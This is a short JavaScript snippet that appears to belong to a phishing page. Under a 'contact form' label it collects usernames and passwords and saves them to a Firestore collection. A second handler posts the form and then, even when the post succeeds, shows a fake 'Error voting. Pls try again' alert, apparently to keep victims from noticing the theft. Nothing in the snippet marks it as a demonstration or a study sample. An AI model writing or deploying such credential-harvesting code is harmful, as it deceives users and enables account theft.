
  // submit contact data
  const contactForm = document.querySelector(".contactForm");
  const username = document.querySelector(".username");
  const password = document.querySelector(".password");
  const submit = document.querySelector(".submitForm");
  
  submit.addEventListener("click", (e) => {
    e.preventDefault();
    db.collection("contact-form")
      .doc()
      .set({
        username: username.value,
        password: password.value,
        
      })
      .then(() => {
        contactForm.reset();
        modal.classList.toggle("display-none");
      });
  });

  const handleSubmit = (event) => {
    event.preventDefault();
  
    const myForm = event.target;
    const formData = new FormData(myForm);
    
    fetch("/", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams(formData).toString(),
    })
      .then(() => alert("Error voting. Pls try again"))
      .catch((error) => alert(error));
  };
  
  document
    .querySelector("form")
    .addEventListener("submit", handleSubmit);
  